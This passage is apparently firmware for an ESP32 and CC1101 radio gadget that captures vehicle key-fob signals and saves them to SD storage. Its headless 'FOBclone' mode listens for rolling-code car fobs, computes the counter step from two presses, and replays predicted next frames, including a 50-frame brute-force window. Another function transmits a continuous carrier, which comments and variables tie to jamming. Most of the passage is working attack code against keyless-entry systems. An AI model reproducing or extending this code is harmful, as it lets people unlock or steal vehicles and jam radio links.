  String k="\""; k+=key; k+="\":";
  int i=j.indexOf(k);
  if(i<0) return "";
  i+=k.length();
  int e=i;
  while(e<(int)j.length() && j[e]!=',' && j[e]!='}') e++;
  return j.substring(i,e);
}

// Write one FOBworks RAW file and one index line. The phone reads the index.
static void sdSaveKept(const String& decode){
  if(!sdMounted||!decodeIsKept(decode)||rfLen<4) return;
  digitalWrite(PIN_CC1101_CS,HIGH);
  digitalWrite(PIN_LORA_CS,HIGH);
  digitalWrite(PIN_SD_CS,HIGH);
  if(!SD.exists("/fobworks")) SD.mkdir("/fobworks");
  static uint16_t seq=0;
  char path[40];
  snprintf(path,sizeof(path),"/fobworks/c%lu_%u.sub",(unsigned long)millis(),seq++);
  File f=SD.open(path,FILE_WRITE);
  if(!f) return;
  String proto=jsonQuotedField(decode,"proto");
  String serial=jsonRawField(decode,"sn");
  if(!serial.length()) serial=jsonRawField(decode,"addr");
  if(!serial.length()) serial=jsonRawField(decode,"code");
  uint32_t hz=(uint32_t)(rfFreq*1e6f+0.5f);
  f.print("Filetype: FOBworks RAW File\r\nVersion: 1\r\n");
  f.print("Frequency: "); f.print(hz); f.print("\r\n");
  f.print("Preset: FOBworks-OOK-270\r\n");
  f.print("Protocol: "); f.print(proto); f.print("\r\n");
  f.print("Serial: "); f.print(serial); f.print("\r\n");
  f.print("RAW_Data:");
  { String rs; rawAppendPulses(rs,rfBuf,rfLen,512,rfStartHigh); f.print(rs); }
  f.print("\r\n");
  f.close();
  File idx=SD.open("/fobworks/library.txt",FILE_APPEND);
  if(idx){
    idx.print(path); idx.print('\t');
    idx.print(proto); idx.print('\t');
    idx.print(serial); idx.print('\t');
    idx.println(rfFreq,2);
    idx.close();
  }
  addLog(String("[SD] ")+path);
}

static void markDecodeKept(const String& decode){
  if(!decodeIsKept(decode)) return;
  decodeFlashUntil=millis()+220;
  setLed(255,255,255);
  sdSaveKept(decode);
}

static void sdClearLibrary(){
  if(!sdMounted) return;
  digitalWrite(PIN_CC1101_CS,HIGH);
  digitalWrite(PIN_LORA_CS,HIGH);
  File idx=SD.open("/fobworks/library.txt",FILE_READ);
  if(idx){
    while(idx.available()){
      String line=idx.readStringUntil('\n');
      line.trim();
      int tab=line.indexOf('\t');
      String path=tab>=0?line.substring(0,tab):line;
      if(path.startsWith("/fobworks/")) SD.remove(path.c_str());
    }
    idx.close();
  }
  SD.remove("/fobworks/library.txt");
}

// ─── Frequency-preset cycling (single-tap) ───────────────────────────────────
// Three named presets cover the main automotive bands.  The selected preset
// is stored in NVS and applied automatically when headless scan starts.

static void cycleFreqPreset(){
  freqPresetIdx = (freqPresetIdx + 1) % N_PRESETS;
  const char* name = FREQ_PRESETS[freqPresetIdx].name;
  addLog("[BTN] Freq preset → " + String(name));
  // LED flash: NA=blue · EU=green · ALL=purple
  if(freqPresetIdx == 0)      setLed(0,   0, 200);
  else if(freqPresetIdx == 1) setLed(0, 200,   0);
  else                        setLed(120,  0, 200);
  beep(1200 + (int)freqPresetIdx * 300, 80);
  delay(500);
  hsPrefs.begin("hslib", false);
  hsPrefs.putUChar("preset", freqPresetIdx);
  hsPrefs.end();
  // Restore active LED (FOBclone=blue, FOBscan=orange, idle=green)
  if(hfcActive)           setLed(0, 20, 200);
  else if(headlessActive) setLed(255, 80, 0);
  else                    setLed(0, 150, 65);
  serialEmit("{\"event\":\"freq_preset\",\"idx\":" + String(freqPresetIdx) +
             ",\"name\":\"" + String(name) +
             "\",\"sMin\":" + String(FREQ_PRESETS[freqPresetIdx].sMin, 1) +
             ",\"sMax\":" + String(FREQ_PRESETS[freqPresetIdx].sMax, 1) + "}");
}

// ─── Headless standalone scan — toggle (double-tap) ─────────────────────────
// Headless mode: CC1101 auto-capture runs normally; every non-noise decoded
// signal is also saved to the NVS library via hsLib_save().  LED breathes
// orange.  Signals are re-emitted to the dashboards on next power-on / connect.

static void toggleHeadlessScan(){
  headlessActive = !headlessActive;
  if(headlessActive){
    // Mutual exclusivity: FOBclone off when FOBscan activates
    if(hfcActive){ hfcActive = false; hfcState = HFC_SCANNING; hfcProto = "";
                   addLog("[HS] FOBclone headless disabled — FOBscan taking over"); }
    // Apply current freq preset as sweep + capture bounds
    sweepMin    = FREQ_PRESETS[freqPresetIdx].sMin;
    sweepMax    = FREQ_PRESETS[freqPresetIdx].sMax;
    capRangeMin = FREQ_PRESETS[freqPresetIdx].sMin;
    capRangeMax = FREQ_PRESETS[freqPresetIdx].sMax;
    swp_save();
    initFreqStats();
    scanActive     = true;
    scanUserPaused = false;
    addLog("[HS] Headless scan ON — preset: " + String(FREQ_PRESETS[freqPresetIdx].name));
    setLed(255, 80, 0);  // orange
    beep(1800, 80); delay(50); beep(2400, 80);
    serialEmit("{\"event\":\"headless_scan\",\"active\":true,\"preset\":\"" +
               String(FREQ_PRESETS[freqPresetIdx].name) + "\",\"sMin\":" +
               String(sweepMin, 1) + ",\"sMax\":" + String(sweepMax, 1) + "}");
  } else {
    addLog("[HS] Headless scan OFF");
    setLed(0, 150, 65);  // idle green
    beep(800, 100);
    serialEmit("{\"event\":\"headless_scan\",\"active\":false}");
  }
}

// ─── FOBclone headless — toggle (double-tap) ─────────────────────────────────
// Scans for rolling-code vehicle fobs.  On 1st capture: amber blink (needs one
// more).  On 2nd capture (delta known): green flash.  A device button press
// (single tap) in the ready state triggers the replay sequence.
static void toggleFobcloneScan(){
  hfcActive = !hfcActive;
  hfcState  = HFC_SCANNING;
  hfcProto  = "";
  if(hfcActive){
    // Mutual exclusivity: FOBscan off when FOBclone activates
    if(headlessActive){ headlessActive = false;
                        addLog("[HFC] FOBscan headless disabled — FOBclone taking over"); }
    // Apply current freq preset
    sweepMin    = FREQ_PRESETS[freqPresetIdx].sMin;
    sweepMax    = FREQ_PRESETS[freqPresetIdx].sMax;
    capRangeMin = FREQ_PRESETS[freqPresetIdx].sMin;
    capRangeMax = FREQ_PRESETS[freqPresetIdx].sMax;
    swp_save();
    initFreqStats();
    scanActive     = true;
    scanUserPaused = false;
    addLog("[HFC] FOBclone headless ON — preset: " + String(FREQ_PRESETS[freqPresetIdx].name));
    setLed(0, 20, 200);  // blue
    beep(1800, 70); delay(30); beep(2200, 70); delay(30); beep(2600, 100);
    serialEmit("{\"event\":\"hfc_scan\",\"active\":true,\"preset\":\"" +
               String(FREQ_PRESETS[freqPresetIdx].name) + "\",\"sMin\":" +
               String(sweepMin, 1) + ",\"sMax\":" + String(sweepMax, 1) + "}");
  } else {
    addLog("[HFC] FOBclone headless OFF");
    setLed(0, 150, 65);  // idle green
    beep(800, 100);
    serialEmit("{\"event\":\"hfc_scan\",\"active\":false}");
  }
}

// ─── FOBclone headless — process auto-capture ─────────────────────────────────
// Called from the auto-capture path whenever a signal is decoded while
// hfcActive is true.  Only rolling-code protocols (predict.window > 0) advance
// the state machine; fixed-code captures are ignored.
static void hfc_onDecode(const String& dec){
  JsonDocument jd;
  if(deserializeJson(jd, dec) != DeserializationError::Ok) return;
  int32_t win = (int32_t)(jd["predict"]["window"] | 0);
  if(win == 0) return;  // fixed code — not a rolling vehicle fob
  String proto  = jd["proto"] | "";
  int32_t delta = (int32_t)(jd["predict"]["delta"] | 0);
  hfcProto = proto;
  // Persist signal to NVS (tagged hfc:true so dashboard can distinguish)
  String compact = dec;
  int pi = compact.indexOf(",\"pulse_us\"");
  if(pi >= 0){ int pe = compact.indexOf(']', pi); if(pe > pi) compact = compact.substring(0, pi) + compact.substring(pe + 1); }
  if(compact.endsWith("}")) compact = compact.substring(0, compact.length()-1) + ",\"hfc\":true}";
  hsPrefs.begin("hslib", false);
  int cnt = hsPrefs.getInt("cnt", 0); int idx2 = hsPrefs.getInt("idx", 0);
  hsPrefs.putString(("s" + String(idx2)).c_str(), compact);
  idx2 = (idx2 + 1) % HS_MAX; if(cnt < HS_MAX) cnt++;
  hsPrefs.putInt("cnt", cnt); hsPrefs.putInt("idx", idx2);
  hsPrefs.end();
  if(delta != 0){
    // 2nd+ capture — delta resolved — ready to replay
    hfcState = HFC_READY;
    setLed(0, 180, 20);
    beep(1600, 80); delay(40); beep(2400, 120);
    addLog("[HFC] Ready — proto=" + proto + " delta=" + String(delta) + " — tap to replay");
    serialEmit("{\"event\":\"hfc_ready\",\"proto\":\"" + proto +
               "\",\"delta\":" + String(delta) +
               ",\"state\":" + String(HFC_READY) + "}");
  } else {
    // 1st capture — need a second fob press for delta
    hfcState = HFC_NEEDS_MORE;
    setLed(200, 90, 0);
    beep(1200, 80);
    addLog("[HFC] Captured " + proto + " — press fob again for delta");
    serialEmit("{\"event\":\"hfc_needs_more\",\"proto\":\"" + proto +
               "\",\"state\":" + String(HFC_NEEDS_MORE) + "}");
  }
}

// Forward declaration — defined later in the file
void replaySeq(const String& proto,uint32_t sn,int32_t startCtr,int32_t delta,float mhz,int te,uint8_t ctrl,int nCand);

// ─── FOBclone headless — replay (single-tap when HFC_READY) ──────────────────
// Attempts replay in order of most-to-least likely to succeed:
//   1. replayPredicted() — frame rebuilt with counter+delta (handles all protocols)
//   2. replaySeq(3)      — next 3 counter frames swept as a sequence
//   3. replaySeq(50)     — 50-frame targeted bruteforce window
static void hfc_doReplay(){
  setLed(0, 200, 200);  // cyan = transmitting
  addLog("[HFC] Replay — proto=" + hfcProto);
  serialEmit("{\"event\":\"hfc_replay_start\",\"proto\":\"" + hfcProto + "\"}");
  // Method 1: frame rebuild / predicted / raw
  String r1 = replayPredicted();
  serialEmit(r1);
  bool ok1 = (r1.indexOf("\"ok\":true") >= 0);
  // Method 2 + 3: sequence / bruteforce for rolling protocols with known delta
  {
    JsonDocument jd;
    if(deserializeJson(jd, lastDecode) == DeserializationError::Ok){
      String proto = jd["proto"] | "";
      uint32_t sn  = jd.containsKey("sn") ? (uint32_t)jd["sn"] : (uint32_t)jd["addr"];
      int32_t  ctr = jd.containsKey("ctr") ? (int32_t)(uint32_t)jd["ctr"]
                                            : (int32_t)(uint32_t)jd["roll"];
      int32_t  delta = (int32_t)(jd["predict"]["delta"] | 1);
      float    mhz   = atof(jd["freq"] | "433.92");
      int      te    = clampTe(jd["te_us"] | 360);
      uint8_t  ctrl  = (uint8_t)(uint32_t)jd["btn"];
      if(proto.length() > 0 && delta != 0){
        replaySeq(proto, sn, ctr, delta, mhz, te, ctrl, 3);   // next 3 frames
        delay(200);
        replaySeq(proto, sn, ctr, delta, mhz, te, ctrl, 50);  // 50-frame window
      }
    }
  }
  // LED: stay on ready-green so user can replay again if needed
  setLed(0, 180, 20);
  serialEmit("{\"event\":\"hfc_replay_done\",\"ok\":" + String(ok1?"true":"false") + "}");
  addLog("[HFC] Replay done — " + String(ok1?"ok":"raw-fallback"));
}

// ─── Power on (called from doPowerOff wake loop) ──────────────────────────────
static void doPowerOn(){
  systemON = true;
  rgb.begin(); rgb.setBrightness(80);
  setLed(0, 0, 255); delay(200);
  // Boot tones (ascending)
  beep(600, 60); delay(20); beep(1200, 60); delay(20); beep(2400, 100);
  // Re-init WiFi AP
  WiFi.persistent(false); WiFi.setSleep(false); WiFi.mode(WIFI_AP);
  IPAddress wip(192,168,4,1);
  WiFi.softAPConfig(wip, wip, IPAddress(255,255,255,0));
  if(deviceCredentialsReady)
    WiFi.softAP(AP_SSID, deviceApPassword.c_str(), 6, 0, 4);
  esp_wifi_set_ps(WIFI_PS_NONE);
  delay(200);
  // Re-init CC1101
  SPI.begin(PIN_SCK, PIN_MISO, PIN_MOSI, -1); delay(50);
  cc_init(curFreq);
  // Restore scanner
  scanActive = !scanUserPaused;
  if(hfcActive)           setLed(0, 20, 200);
  else if(headlessActive) setLed(255, 80, 0);
  else                    setLed(0, 150, 65);
  addLog("[SYS] Power on — " + String(FW_VER));
  serialEmit("{\"event\":\"power_on\",\"fw\":\"" + String(FW_VER) + "\"}");
}

// ─── Power off → light sleep → wake sequence (adapted from SGP_Hacker) ────────
// Shutdown: sound + red LED fade, CC1101 SPWD, WiFi off.
// Low battery (<3.2 V): deep sleep (no wake until recharged).
// Normal: light sleep; wake on button press.  After wake, require a fresh 3 s
// hold (green bar fills up) to power on — releases avoid accidental restarts.
static void doPowerOff(){
  systemON      = false;
  headlessActive = false;
  hfcActive = false; hfcState = HFC_SCANNING; hfcProto = "";
  addLog("[SYS] Power off");
  // Shutdown sound (descending, from SGP_Hacker)
  beep(2400, 80); delay(30); beep(1600, 80); delay(30); beep(800, 120);
  // Red fade-out
  setLed(255, 0, 0); delay(400);
  for(int i = 255; i >= 0; i -= 8){ setLed(i, 0, 0); delay(15); }
  setLed(0, 0, 0);
  // Stop scanner
  scanActive = false;
  // CC1101: SIDLE → SPWD
  SPI.beginTransaction(SPISettings(6000000, MSBFIRST, SPI_MODE0));
  cc_strobe(0x36); delay(1);   // SIDLE
  cc_strobe(0x39); delay(1);   // SPWD
  SPI.endTransaction();
  loraHardReset();             // SX1278 sleep so DIO0 does not hold GPIO 48
  // Stop WiFi
  WiFi.disconnect(true); esp_wifi_stop();
  // Sensor rail off (powers RGB level-shifter)
  digitalWrite(PIN_SENSOR_CE, LOW);
  // Low battery → deep sleep
  if(battPct > 0 && battV < 3.2f){
    addLog("[PWR] Battery low — deep sleep");
    Serial.flush(); delay(100);
    esp_deep_sleep_start();
    return;
  }
  // Wait for button release before sleeping
  unsigned long rw = millis();
  while(digitalRead(PIN_BTN) == LOW && millis() - rw < 10000) delay(50);
  delay(500);
  // Configure GPIO37 as wake source and enter light sleep
  gpio_wakeup_enable((gpio_num_t)PIN_BTN, GPIO_INTR_LOW_LEVEL);
  esp_sleep_enable_gpio_wakeup();
  Serial.flush(); delay(100);
  esp_err_t ret = esp_light_sleep_start();
  if(ret != ESP_OK) esp_deep_sleep_start();

  // ── WOKE UP — require a fresh 3 s hold to power on (SGP_Hacker pattern) ──
  // If the user releases before 3 s, go back to sleep.
  while(true){
    rgb.begin(); rgb.setBrightness(80); setLed(0, 0, 0);
    unsigned long hs = millis(); bool ok = false;
    while(digitalRead(PIN_BTN) == LOW){
      unsigned long h = millis() - hs;
      if(h > 200){
        int p = constrain((int)map(h, 200, 3000, 0, 255), 0, 255);
        setLed(0, p, 0);   // green bar fills as hold progresses
      }
      if(h >= 3000){ ok = true; break; }
      delay(20);
    }
    if(ok){
      while(digitalRead(PIN_BTN) == LOW) delay(50);  // wait for release
      delay(200);
      gpio_wakeup_disable((gpio_num_t)PIN_BTN);
      digitalWrite(PIN_SENSOR_CE, HIGH); delay(50);  // re-power sensor rail
      doPowerOn();
      return;
    }
    // Released before 3 s → back to sleep
    setLed(0, 0, 0); delay(5);
    gpio_wakeup_enable((gpio_num_t)PIN_BTN, GPIO_INTR_LOW_LEVEL);
    esp_sleep_enable_gpio_wakeup();
    delay(300); Serial.flush();
    ret = esp_light_sleep_start();
    if(ret != ESP_OK) esp_deep_sleep_start();
  }
}

// ─── CC1101 Driver ───────────────────────────────────────────────────────────
// CC1101 spec §10.1: after CS goes LOW, wait for MISO (CHIP_RDYn) to go LOW
// before starting any SPI transfer.  Skipping this corrupts every transaction —
// especially right after a strobe while the chip is changing state.
bool cc_waitMISO(uint16_t usTimeout=2000){
  unsigned long t=micros();
  while(digitalRead(PIN_MISO)){if(micros()-t>usTimeout)return false;}
  return true;
}
// Deselect all SPI peers before asserting CC1101 CS.  The SX1278 shares the
// same MOSI/MISO/SCK bus; leaving its CS low causes bus contention and
// corrupts every CC1101 SPI transaction.
void cc_cs(bool sel){
  if(sel){
    digitalWrite(PIN_LORA_CS,HIGH);
    digitalWrite(PIN_SD_CS,HIGH);
    digitalWrite(PIN_CC1101_CS,LOW);
  } else {
    digitalWrite(PIN_CC1101_CS,HIGH);
  }
}
// The May 2026 card has a Ra-02 SX1278 whose DIO0 is wired to GPIO 48. The CC1101's
// GDO0 is not routed to a readable ESP32 pin on this revision. Reset and sleep the
// SX1278 for its SPI setup, but do not rely on either to create a CC1101 GDO0 path.
// Read one SX1278 register. Bit 7 clear = read on SX1278 (unlike the CC1101).
static uint8_t loraReadReg(uint8_t a){
  digitalWrite(PIN_LORA_CS,LOW);
  delayMicroseconds(50);
  SPI.transfer(a&0x7F);
  uint8_t v=SPI.transfer(0x00);
  digitalWrite(PIN_LORA_CS,HIGH);
  delayMicroseconds(50);
  return v;
}

// Read back RegOpMode to confirm the sleep command reached the SX1278. A successful
// readback does not mean GPIO 48 is connected to the CC1101; the board measurement
// found no CC1101 GDO0 route.
uint8_t loraOpModeAfterSleep = 0xFF;   // 0x00 = SLEEP confirmed; 0xFF = never sampled

// Call outside an SPI transaction. loraHardReset opens and closes its own.
static void loraSleepNow(){
  digitalWrite(PIN_LORA_CS,LOW);
  delayMicroseconds(100);
  SPI.transfer(0x81);   // write RegOpMode (0x01)
  SPI.transfer(0x00);   // SLEEP. In sleep, SX1278 DIO pins are high-impedance.
  digitalWrite(PIN_LORA_CS,HIGH);
  delay(10);
  loraOpModeAfterSleep = loraReadReg(0x01);   // did it actually take?
}
static void loraHardReset(){
  pinMode(PIN_LORA_CS, OUTPUT);
  digitalWrite(PIN_LORA_CS, HIGH);
  pinMode(PIN_LORA_RST, OUTPUT);
  digitalWrite(PIN_LORA_RST, LOW);
  delayMicroseconds(200);          // SX1278 POR requires ≥100 µs
  digitalWrite(PIN_LORA_RST, HIGH);
  delay(12);                       // datasheet settle is ≥5 ms
  SPI.beginTransaction(SPISettings(1000000,MSBFIRST,SPI_MODE0));
  loraSleepNow();
  SPI.endTransaction();
}

// ─── Park the SX1278 for RF work ─────────────────────────────────────────────
// Hold the module in reset rather than relying on the SPI sleep register. The register
// write does land -- loraSleepNow() reads RegOpMode back and reports 0x00 -- but the part
// still contributes noise to the shared front end, and the vendor's own documentation says
// the lowest-power state is RST held LOW ("LoRa RST -> hold LOW (reset = lowest power)").
//
// Measured on the card at 700 MHz, a band no consumer device uses:
//
//   rail powered, module slept by register   floor -101/-102 dBm   3 of 3 false captures
//   RST held LOW                             floor -112 dBm         0 of 3
//
// A capture fires when the RSSI crosses trigThr, which is floor+10, so an 11 dB lower floor
// moves the trigger from -91 to -102 and the module's own noise stops crossing it. The false
// captures were the SX1278 being powered and awake, not local RF: the same test at 700 MHz
// rules neighbours out, because nothing transmits there.
//
// loraHardReset() above still runs first, because the SPI sleep is what guarantees DIO0 goes
// high-Z, and GPIO 48 is shared with the CC1101. RST-low is added on top as the quieter state.
static void loraParkReset(){
  pinMode(PIN_LORA_CS, OUTPUT);
  digitalWrite(PIN_LORA_CS, HIGH);   // deselect, or it drives MISO into the shared bus
  pinMode(PIN_LORA_RST, OUTPUT);
  digitalWrite(PIN_LORA_RST, LOW);   // held low: lowest power, per the vendor's sequence
}
uint8_t cc_xfer(uint8_t b){ return SPI.transfer(b); }
void cc_strobe(uint8_t s){ cc_cs(true); cc_waitMISO(); cc_xfer(s); cc_cs(false); }
void cc_writeReg(uint8_t a,uint8_t v){ cc_cs(true); cc_waitMISO(); cc_xfer(a); cc_xfer(v); cc_cs(false); }
uint8_t cc_readReg(uint8_t a){ cc_cs(true); cc_waitMISO(); cc_xfer(a|0x80); uint8_t v=cc_xfer(0); cc_cs(false); return v; }
// Status registers (0x30-0x3D) require burst bit (0xC0) — single-read returns FIFO data.
uint8_t cc_readStatus(uint8_t a){ cc_cs(true); cc_waitMISO(); cc_xfer(a|0xC0); uint8_t v=cc_xfer(0); cc_cs(false); return v; }
// Forward declaration: cc_init() programs the PA table before this is defined below.
void cc_writeBurst(uint8_t addr,const uint8_t* p,uint8_t n);

// ─── Packet-mode TX over the FIFO ────────────────────────────────────────────
// The CC1101's GDO0 is not routed on this board, so async bit-bang TX cannot drive
// the PA. Packet mode sends data from the chip's FIFO and does not need GDO0. It can
// send protocol frames, but not reproduce arbitrary captured pulse timing: the chip
// adds packet framing. C1/C2's decoded frames fit this path.
void cc_writeBurst(uint8_t addr,const uint8_t* p,uint8_t n){
  cc_cs(true); cc_waitMISO();
  cc_xfer(addr|0x40);                 // burst write
  for(uint8_t i=0;i<n;i++) cc_xfer(p[i]);
  cc_cs(false);
}

// Transmit one packet and wait, with a deadline, for the TX FIFO to drain. Always
// return the chip to idle and restore the receive configuration afterward.
bool cc_txPacket(float mhz,const uint8_t* payload,uint8_t n,uint8_t chan){
  if(n==0||n>64) return false;        // CC1101 FIFO is 64 B
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_setFreq(mhz);
  cc_writeReg(0x0A,chan);             // CHANNR
  // Fixed-length packet mode; no whitening or CRC. (0x30 is async serial and needs GDO0.)
  cc_writeReg(0x08,0x00);
  cc_writeReg(0x06,n);                // PKTLEN
  cc_writeReg(0x07,0x00);             // PKTCTRL1: no address check, no append status
  cc_strobe(0x36);                    // SIDLE
  cc_strobe(0x3B);                    // SFTX: flush TX FIFO
  cc_writeBurst(0x3F,payload,n);      // write payload
  uint8_t txb=cc_readStatus(0x3A);    // TXBYTES, 7-bit count
  cc_strobe(0x35);                    // STX
  SPI.endTransaction();
  // Drain wait, bounded. Reading a status register needs its own transaction.
  unsigned long t0=millis();
  bool drained=false;
  while(millis()-t0<500){
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    uint8_t left=cc_readStatus(0x3A)&0x7F;
    SPI.endTransaction();
    if(left==0){drained=true;break;}
    delay(2);
  }
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_strobe(0x36);                    // SIDLE: never leave TX running
  // Restore the capture configuration (async serial RX) so the next capture works.
  cc_writeReg(0x08,0x30);
  cc_writeReg(0x02,0x0D);
  cc_strobe(0x36); delay(1); cc_strobe(0x34);
  SPI.endTransaction();
  return drained && txb>0;
}

// Send an unmodulated carrier without GDO0. Packet mode keys the PA from the chip;
// async mode would need the missing data pin. The FIFO is kept full of 0xFF (OOK high,
// PATABLE index 1 = 0xC0), and the function checks MARCSTATE rather than reporting
// success unconditionally. Refills must keep ahead of FIFO underflow.
int  lastTxMarcState=-1;  // MARCSTATE observed while trying to reach TX (diagnostic)
int  txDiagMcsM1=-1;      // MCSM1 at attempt time (TXOFF_MODE decides post-TX state)
bool lastTxUnderflow=false;// did the TX FIFO run dry mid-carrier? (a gap means no jam)
// Record which TX path replayRaw() used; a success reply must name the path.
enum ReplayPath { REPLAY_NONE=0, REPLAY_VIA_GDO0, REPLAY_VIA_FIFO };
ReplayPath lastReplayPath=REPLAY_NONE;
bool cc_txCarrier(float mhz,uint16_t ms){
  if(ms==0||ms>5000) return false;
  // Fixed-length packet, PKTLEN=255, FIFO fed in 64-byte chunks.
  //
  // The TX FIFO is 64 bytes (datasheet: "Data buffering with separate 64-byte TX and RX
  // FIFOs"). An earlier version wrote the whole 255-byte payload in one burst, so only 64
  // bytes landed and the rest was discarded -> underflow. The documented pattern for a
  // packet longer than the FIFO is to fill it repeatedly ("filling the 64-byte TX FIFO six
  // times"), and PKTLEN terminates TX when the byte counter reaches it.
  //
  // At ~8.9 kBaud, 64 bytes is ~58 ms of carrier, so polling every few ms keeps it fed.
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_setFreq(mhz);
  cc_writeReg(0x02,0x2E);             // GDO0 high-Z: not our data path, must not be driven
  cc_writeReg(0x12,0x30);             // MDMCFG2: ASK/OOK, SYNC_MODE=0 (no preamble/sync)
  cc_writeReg(0x08,0x00);             // PKTCTRL0: FORMAT=00 FIFO, CRC off, FIXED length
  cc_writeReg(0x06,255);              // PKTLEN: TX ends when 255 bytes have been sent
  // MDMCFG4 = CHANBW_E[7:6]:CHANBW_M[5:4]:DRATE_E[3:0]. The low nibble is the data-rate
  // exponent: 0x4C is DRATE_E=12 (~142 kBaud). 0x48 is DRATE_E=8 -> ~8.9 kBaud.
  cc_writeReg(0x10,0x48); cc_writeReg(0x11,0x65);
  cc_strobe(0x36);
  cc_strobe(0x3B);                    // SFTX
  SPI.endTransaction();

  uint8_t ones[64]; for(int i=0;i<64;i++) ones[i]=0xFF;
  bool enteredTx=false, sawUnderflow=false; int lastMarc=-1, maxMarc=9;
  unsigned long t0=millis();
  unsigned long hardStop=t0+(unsigned long)ms+2000;
  // Prime the FIFO, then start the packet.
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_writeBurst(0x3F,ones,64);
  cc_strobe(0x35);                    // STX
  SPI.endTransaction();
  unsigned long lastFeed=millis();
  while(millis()-t0<(unsigned long)ms && millis()<hardStop){
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    int txb=cc_readStatus(0x3A);        // bit7 underflow, bits6:0 bytes queued
    lastMarc=cc_readStatus(0x35)&0x1F;
    SPI.endTransaction();
    if(txb&0x80) sawUnderflow=true;
    // TX is MARCSTATE 19 or 20 (datasheet state diagram, §19). An earlier version tested
    // 17, which is RXFIFO_OVERFLOW, so a working transmission reported as a failure.
    if(lastMarc==19||lastMarc==20) enteredTx=true;
    if(lastMarc>maxMarc) maxMarc=lastMarc;
    // Keep the FIFO topped up: the count only decreases as the chip clocks bytes out.
    if((txb&0x7F)<56) {
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      cc_writeBurst(0x3F,ones,56);
      SPI.endTransaction();
    }
    // When the packet's byte counter completes, TX ends by itself; restart a new packet so
    // the carrier continues. ~230 ms of carrier per 255-byte packet at this rate.
    if(lastMarc==1 || lastMarc==18){    // IDLE1 or FSTXON: packet finished, restart
      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
      cc_strobe(0x3B);                  // SFTX before restarting
      cc_writeBurst(0x3F,ones,64);
      cc_strobe(0x35);                  // STX next packet
      SPI.endTransaction();
    }
    if(millis()-lastFeed>5) lastFeed=millis();
    delay(2);
  }
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_strobe(0x36);                    // SIDLE: carrier off
  cc_strobe(0x3B);                    // SFTX: required to leave TXFIFO_UNDERFLOW
  cc_writeReg(0x08,0x30);             // restore async RX
  cc_writeReg(0x02,0x0D);
  cc_strobe(0x36); delay(1); cc_strobe(0x34);
  SPI.endTransaction();
  lastTxMarcState=lastMarc;
  lastTxUnderflow=sawUnderflow;
  // Report TX reached only if it was actually seen AND the carrier never gapped. An
  // underflow means the PA had nothing to send for part of the window, which is not a jam.
  return enteredTx && !sawUnderflow;
}

void cc_setFreq(float mhz){
  // Note: does NOT update curFreq — that is the user's chosen frequency.
  // Only callers that represent a user-intent change should set curFreq explicitly.
  uint32_t fr=(uint32_t)((mhz*65536.0)/26.0);
  cc_writeReg(0x0D,(fr>>16)&0xFF);
  cc_writeReg(0x0E,(fr>>8)&0xFF);
  cc_writeReg(0x0F,fr&0xFF);
}

int cc_rssi(){
  uint8_t r=cc_readStatus(0x34);   // 0x34=RSSI, status reg → burst-read (0xC0)
  return (r>=128)?((int)r-256)/2-74:(int)r/2-74;
}
// Fast path: skip MISO wait (chip stable in RX), direct 0xF4 byte (=0x34|0xC0).
// Call only inside an open SPI.beginTransaction block.
int cc_fastRSSI(){
  cc_cs(true);
  SPI.transfer(0xF4);              // burst-read of RSSI status register
  uint8_t r=SPI.transfer(0);
  cc_cs(false);
  return (r>=128)?((int)r-256)/2-74:(int)r/2-74;
}

void cc_reset(){
  // Power-on reset per CC1101 datasheet §10.1: pulse CS before SRES strobe.
  digitalWrite(PIN_CC1101_CS,HIGH); delayMicroseconds(30);
  digitalWrite(PIN_CC1101_CS,LOW);  delayMicroseconds(30);
  digitalWrite(PIN_CC1101_CS,HIGH); delayMicroseconds(45);
  digitalWrite(PIN_CC1101_CS,LOW);  delay(1);
  cc_waitMISO();
  SPI.transfer(0x30);               // SRES
  digitalWrite(PIN_CC1101_CS,HIGH); delay(10);
}

bool cc_init(float mhz){
  // Use 1 MHz for the init transaction: at cold-boot the GPIO-matrix routing and
  // CC1101 CHIP_RDYn handshake are unreliable at 6 MHz.  All subsequent
  // operational transactions keep 6 MHz once the chip is confirmed alive.
  loraHardReset(); // SX1278 asleep, DIO0 released, before CC1101 uses GPIO 48
  // Jam guard: if the previous session died mid-jam the radio can still be in TX,
  // and cc_reset() only issues SRES — which does not by itself drive GDO0, the
  // async TX data input. Holding GDO0 LOW as an OUTPUT puts a definite
  // no-carrier level on that input across the reset, before SIDLE and the RX
  // reconfiguration below. setup() does the same thing first (`research/09` §2.2);
  // it is repeated here so cc_init() is safe to call on any path, including the
  // /api/reinit route.
  pinMode(PIN_GDO0,OUTPUT);
  digitalWrite(PIN_GDO0,LOW);
  SPI.beginTransaction(SPISettings(1000000,MSBFIRST,SPI_MODE0));
  cc_reset();
  cc_strobe(0x36);                 // SIDLE: leave TX/any active state
  jamActive=false; jamFreq=0.0f;
  // Register block verified on the SGP Card Mini.
  // Key settings: IOCFG0=0x0D (GDO0→async serial), PKTCTRL0=0x30 (async serial,
  // fixed-len), MDMCFG2=0x30 (OOK, no sync), MDMCFG4/3=0x4C/0x22 (406 kHz BW).
  cc_writeReg(0x00,0x2E); cc_writeReg(0x02,0x0D); cc_writeReg(0x03,0x07); cc_writeReg(0x07,0x00);
  cc_writeReg(0x08,0x30); cc_writeReg(0x09,0x00); cc_writeReg(0x0B,0x06);
  cc_setFreq(mhz);
  cc_writeReg(0x10,0x4C); cc_writeReg(0x11,0x22);
  cc_writeReg(0x12,0x30); cc_writeReg(0x13,0x02);
  cc_writeReg(0x14,0xF8); cc_writeReg(0x15,0x00);
  cc_writeReg(0x18,0x18); cc_writeReg(0x19,0x16);
  cc_writeReg(0x1A,0x6C); cc_writeReg(0x1B,0x43); // AGCCTRL2: MAGN_TARGET=3 (33 dBm OOK target — stable)
  cc_writeReg(0x1C,0x68); cc_writeReg(0x1D,0x91); // AGCCTRL0: FILTER_LENGTH=01 (16-sample avg for OOK)
